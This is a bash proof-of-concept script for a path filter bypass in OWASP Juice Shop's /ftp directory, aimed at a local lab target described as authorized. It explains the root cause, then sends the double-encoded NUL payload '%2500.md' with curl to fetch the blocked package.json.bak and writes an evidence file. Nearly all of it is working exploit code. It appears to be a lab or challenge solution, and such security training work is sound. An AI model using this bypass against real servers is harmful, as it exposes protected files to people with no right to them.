#!/usr/bin/env bash
# c02-ftp-bypass PoC — OWASP Juice Shop /ftp extension filter bypass
# Target: http://host.docker.internal:3000 (local lab, authorized)
#
# Root cause: /ftp route only allows ".md" and ".pdf" by checking the extension
# of the *once-decoded* request path. The filename is then decoded a second time
# when the file is resolved from disk. Injecting a double-encoded NUL (%2500)
# followed by an allowed extension makes the guard see "....bak%00.md" (ends in
# .md -> allowed) while the file system resolves "....bak\0.md" -> package.json.bak.
#
# Bypass payload:  %2500.md   (single decode -> "%00.md", second decode -> NUL)

set -u
TARGET="${TARGET:-http://host.docker.internal:3000}"
OUT="${1:-/workspace/evidence}"
mkdir -p "$OUT"

echo "[*] Negative control (direct .bak, should be 403)"
curl -s -o /dev/null -w "    GET /ftp/package.json.bak -> %{http_code}\n" \
    "$TARGET/ftp/package.json.bak"

URL="$TARGET/ftp/package.json.bak%2500.md"
echo "[*] Bypass URL: $URL"
code=$(curl -s -o "$OUT/package.json.bak" -w "%{http_code}" "$URL")
echo "    -> HTTP $code, $(wc -c < "$OUT/package.json.bak") bytes"

if [ "$code" != "200" ]; then echo "[!] Bypass failed"; exit 1; fi

head -c 500 "$OUT/package.json.bak" > "$OUT/c2_ftp_bypass.txt.tmp"
{
    echo "=== c02-ftp-bypass — evidence ==="
    echo "Target        : $TARGET (OWASP Juice Shop, local lab)"
    echo "Protected dir : /ftp (allows only .md and .pdf)"
    echo "Blocked file  : package.json.bak"
    echo "Direct access : GET $TARGET/ftp/package.json.bak -> HTTP 403"
    echo "               (\"Error: Only .md and .pdf files are allowed!\")"
    echo "Bypass        : double URL-encode a NUL and append an allowed extension"
    echo "               %2500.md  -> decode#1 \"%00.md\" -> decode#2 NUL + \".md\""
    echo "Exact working URL:"
    echo "$URL"
    echo "Result        : HTTP $code, $(wc -c < "$OUT/package.json.bak") bytes, Content-Type: application/octet-stream"
    echo ""
    echo "=== First 500 bytes of package.json.bak ==="
    cat "$OUT/c2_ftp_bypass.txt.tmp"
    echo ""
} > "$OUT/c2_ftp_bypass.txt"
rm -f "$OUT/c2_ftp_bypass.txt.tmp"

echo "[+] Evidence written to $OUT/c2_ftp_bypass.txt"
